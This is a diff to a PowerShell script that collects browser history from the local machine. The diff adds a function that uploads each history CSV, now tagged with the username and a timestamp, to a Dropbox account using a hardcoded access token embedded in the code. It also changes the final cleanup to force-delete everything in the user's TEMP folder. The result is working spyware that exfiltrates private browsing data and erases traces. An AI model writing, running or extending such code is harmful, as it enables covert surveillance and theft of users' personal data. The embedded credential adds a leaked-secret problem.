@@ -50,6 +50,27 @@ function Cleanup-TempFiles {
     }
 }
 
+function DropBox-Upload {
+
+    [CmdletBinding()]
+    param (
+        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+        [Alias("f")]
+        [string]$SourceFilePath
+    ) 
+
+    $DropBoxAccessToken = "sl.u.AFoYRbenuna96IsAifS8a0ebmxuiJx5yhta6Jo1uXb5j6Z6-myXxnIuafInDIpa0Ip0_ftYbYIXFE71FtnWub6oIiBA8_gEc7RF1Z70fmwEGWsX99FP8rpkl2CqBrPK8Pu7W6qiMnS7Sfl3OdpTcWu0mbb1SvYFrEp7CxSknmCiytF0aBSoamLkK7N2j3kS_MPLbCxzmWNGcca_w8OVgzABAxwWh8jlgpMFwIiDxZEXauEgoRFlyw50j1ZGs-dvVvURNh7Tzw8EcO2SgKYSaPbpwpQJJ2x8EaHfheUtn0Utl1IG60bygZY36gqpaCJ2GRrdB2HJ9vPRjza3cWSV8ewCVQ1fKxc2X5NUHjL97dqhmwgYRLGnGuSqykovMBovlFcsHWY7Jx9SBQ-Jz00IMMtZRlttW9ZMZqJTyLzOHwMcNjyzYwD2JPB5ruciUNa091gzqYrFpIvxviuweYVj86NMRlzT_YwHaRn9kEA9bxlYXM0s6wQwl67u1Mt4wo_ZcoCqbzGeEf4Sw9zQwysSlsdx0NDknz-ZrkcQL6MHeHPPPJ6UWUIiM4YkZswKNTfRhXUO0p3XX8KEs146RkSqlrOJuMRrtP8uvmnVI96MNeIyeBUVtZINU4hPt71y9SJKWMG7qhEz9ceywOgDvG7hn43CHqOu5j5Z6UqPETCRzNA8mhHenf2XJhLfgeYam0fighINhjZudqUiZ2ogBOm888lTH9XwBpFZynw9Qt5bRtUNvr0v5W3Yuqs3MO-U8Gv8hehbaYHjfV80k_VV7BTUol-4XP3Qfv-vAemGokYmamk90_biU4ZsqCC-mtEZ2AtOzzBlyiZ6UqAirwR1YDxKLAOPzgJxSsmzQRifsbfT8MEr7whyBKC4FLc0GzB6CTSC9AKUhvwy35P5GNGX0uZ2N0bEuRjRFK3bJwut566V7nfpcb4qgKIUDmDLlqhEPO1qm2LSa4hRFIFUsm8bnljtvfRuSj1Ozku2zJHi7I0GBickBf7yr4WA2C-4pdI8rvAjStLzIq5UiAM5CgXKiU06Cu-YdB5DjixRuo8_1RfoLGWLFAX3YYNCpzwjIqBthHbPaTUL953hYUsrVwlyPPMQ6LkxwtaBu4qo9bHKKs5UG2HdeLnysbF1zy44O7pKVTPHfdhL2yNqmGIdct5GFBNqMoojyFAFgR1EV0MBJ2mxhCqNYNri3zv3Jcve8D0wfhzpUg0uFAqbJcmr7Jkq43lRuqKAgbEQHLhXdVlNoaNzGl6tuzhq9xWWIzUixo61lpYm3NPb5Xv4i6wX6FKmSSqaQa9aIqPiEZKMKNTPAwu-FuZiQKeLJ1J2plz0iFxVhL5BMPfMCoBjW306t5ZYWFXbod1oti7XhEwsZQUzr70xdXSmSY40jDLKVyqUnXLolWKSe5rYBMpGt0Y2U-LAHfx7rZ1qT"   # Replace with your DropBox Access Token
+    $outputFile = Split-Path $SourceFilePath -leaf
+    $TargetFilePath="/$outputFile"
+    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+    $authorization = "Bearer " + $DropBoxAccessToken
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Authorization", $authorization)
+    $headers.Add("Dropbox-API-Arg", $arg)
+    $headers.Add("Content-Type", 'application/octet-stream')
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
 # Iterate through detected browsers
 foreach ($Browser in $BrowserHistoryPaths.Keys) {
     $HistoryDB = $BrowserHistoryPaths[$Browser]
@@ -117,11 +138,13 @@ foreach ($Browser in $BrowserHistoryPaths.Keys) {
 	        # $History | Format-Table -AutoSize
 
             # Save history to CSV
-            $CsvPath = "$env:TEMP\$Browser-History.csv"
+            $CsvPath = "$env:TEMP\$env:USERNAME-$(Get-Date -Format dd-MMMM-yyyy_hh-mm-ss)-$Browser-History.csv"
             $History | Export-Csv -Path $CsvPath -NoTypeInformation
 
             # Output result
             Write-Output "History saved: $CsvPath"
+
+            $CsvPath | DropBox-Upload
         }
         catch {
             Write-Error "An error occurred while processing ${Browser}: $_"
@@ -135,5 +158,5 @@ foreach ($Browser in $BrowserHistoryPaths.Keys) {
     }
 }
 
-Start-Process powershell -ArgumentList "-Command Remove-Item '$env:TEMP\System.Data.SQLite.dll' -Force -ErrorAction SilentlyContinue" -NoNewWindow
-Start-Process powershell -ArgumentList "-Command Remove-Item '$env:TEMP\SQLite.Interop.dll' -Force -ErrorAction SilentlyContinue" -NoNewWindow
+Start-Process powershell -ArgumentList "-Command Remove-Item '$env:TEMP\*' -Force -ErrorAction SilentlyContinue" -NoNewWindow
+# Start-Process powershell -ArgumentList "-Command Remove-Item '$env:TEMP\SQLite.Interop.dll' -Force -ErrorAction SilentlyContinue" -NoNewWindow
